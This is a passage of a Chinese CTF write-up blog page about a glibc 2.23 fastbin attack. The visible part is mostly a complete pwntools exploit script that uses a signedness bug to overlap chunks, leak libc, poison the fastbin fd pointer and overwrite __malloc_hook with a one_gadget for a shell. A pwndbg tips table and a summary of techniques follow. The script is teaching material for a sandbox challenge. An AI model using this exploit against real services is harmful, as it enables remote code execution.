class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;challenge-9da23e04d2452171.sandbox.ctfhub.com&#x27;</span>, <span class="number">31728</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Index:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Index:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Index:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Size:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Content:\n&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Leak Libc via Unsorted Bin</span></span><br><span class="line">add() <span class="comment"># chunk 0</span></span><br><span class="line">add() <span class="comment"># chunk 1</span></span><br><span class="line">add() <span class="comment"># chunk 2</span></span><br><span class="line">add() <span class="comment"># chunk 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发整数溢出，修改 chunk 1 的 size 为 0xe1</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xe1</span>)</span><br><span class="line">edit(<span class="number">0</span>, -<span class="number">1</span>, payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放伪造块进入 Unsorted bin</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新分配切割 Unsorted bin，使 main_arena 指针落入 chunk 2</span></span><br><span class="line">add()</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;Leaked main_arena+88: &quot;</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">libc_base = leak_addr - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;Libc base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="string">&quot;__malloc_hook: &quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Overwrite Fastbin fd</span></span><br><span class="line">add() <span class="comment"># 拿到 index 4</span></span><br><span class="line">delete(<span class="number">4</span>) <span class="comment"># 将 chunk 4 放入 fastbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 chunk 1 溢出，覆盖 chunk 4 的 fd 指针</span></span><br><span class="line">payload2 = <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(fake_chunk)</span><br><span class="line">edit(<span class="number">1</span>, -<span class="number">1</span>, payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Trigger __malloc_hook</span></span><br><span class="line">add() <span class="comment"># 拿回正常的 chunk 4</span></span><br><span class="line">add() <span class="comment"># 拿到分配在 __malloc_hook 附近的 fake_chunk (index 5)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 one_gadget 覆盖 __malloc_hook</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4527a</span></span><br><span class="line">payload_hook = <span class="string">b&#x27;c&#x27;</span> * <span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">edit(<span class="number">5</span>, <span class="number">96</span>, payload_hook)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后一次调用 malloc 触发 hook</span></span><br><span class="line">add()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x05-调试技巧-Pwndbg"><a href="#0x05-调试技巧-Pwndbg" class="headerlink" title="0x05 调试技巧 (Pwndbg)"></a>0x05 调试技巧 (Pwndbg)</h2><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>heap</code> &#x2F; <code>vis</code></td>
+<td>查看堆块结构，确认 size 是否被篡改为 0xe1</td>
+</tr>
+<tr>
+<td><code>fastbins</code></td>
+<td>查看 Fastbin 链表，确认 fd 劫持成功：<code>0x70: 0x... -&gt; __malloc_hook-0x23 -&gt; 0x0</code></td>
+</tr>
+<tr>
+<td><code>arena</code></td>
+<td>确认 Unsorted Bin 是否正确挂载</td>
+</tr>
+<tr>
+<td><code>x/32gx &amp;__malloc_hook - 0x30</code></td>
+<td>寻找天然的 <code>0x7f</code> 数据，计算 fake_chunk 偏移</td>
+</tr>
+</tbody></table>
+<h2 id="0x06-核心考点"><a href="#0x06-核心考点" class="headerlink" title="0x06 核心考点"></a>0x06 核心考点</h2><ul>
+<li><strong>Signedness Bug</strong>：<code>scanf(&quot;%d&quot;)</code> 配合 <code>read/recv</code> 时警惕负数绕过，直接赋予任意堆块无限溢出能力</li>
+<li><strong>Chunk Overlapping</strong>：伪造大块进入 Unsorted Bin，利用切割机制泄露 Libc</li>
+<li><strong>Fastbin Poisoning</strong>：利用错位构造（Misaligned chunk）绕过 size 安全检查</li>
+<li><strong>One Gadget</strong>：覆盖 <code>__malloc_hook</code> 实现代码执行</li>
+</ul>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> FastBin Attack 整数溢出堆利用实战</li>
+        <li><strong>Author:</strong> B1ear</li>
+        <li><strong>Created at
+                :</strong> 2026-05-10 21:32:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-05-10 17:09:12
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://b1ear.github.io/2026/05/10/fastbin-attack/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E5%A0%86%E5%88%A9%E7%94%A8/">#堆利用</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Fastbin/">#Fastbin</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">#整数溢出</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/One-Gadget/">#One Gadget</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/glibc-2-23/">#glibc 2.23</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/05/10/ret2dl-resolve/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">ret2dl_resolve 无输出环境下的动态链接劫持</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">FastBin Attack 整数溢出堆利用实战</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83"><span class="nav-text">0x01 题目环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%A0%B8%E5%BF%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">0x02 核心漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-text">0x03 攻击利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-1-%E4%BC%AA%E9%80%A0-Chunk-%E6%B3%84%E9%9C%B2-Libc-%E5%9F%BA%E5%9D%80"><span class="nav-text">Step 1: 伪造 Chunk 泄露 Libc 基址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-2-Fastbin-Poisoning-%E5%8A%AB%E6%8C%81-fd-%E6%8C%87%E9%92%88"><span class="nav-text">Step 2: Fastbin Poisoning (劫持 fd 指针)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-3-%E8%A7%A6%E5%8F%91-One-Gadget-Get-Shell"><span class="nav-text">Step 3: 触发 One Gadget (Get Shell)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Exploit-%E4%BB%A3%E7%A0%81"><span class="nav-text">0x04 Exploit 代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7-Pwndbg"><span class="nav-text">0x05 调试技巧 (Pwndbg)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E6%A0%B8%E5%BF%83%E8%80%83%E7%82%B9"><span class="nav-text">0x06 核心考点</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-lollipop"></i>&nbsp;&nbsp;<a href="/">B1ear</a>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+        
+        
+            
+                
+        
+                
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="Image viewer">
+	<button class="image-viewer-close" type="button" aria-label="Close">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="Prev">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="Close">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="Next">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
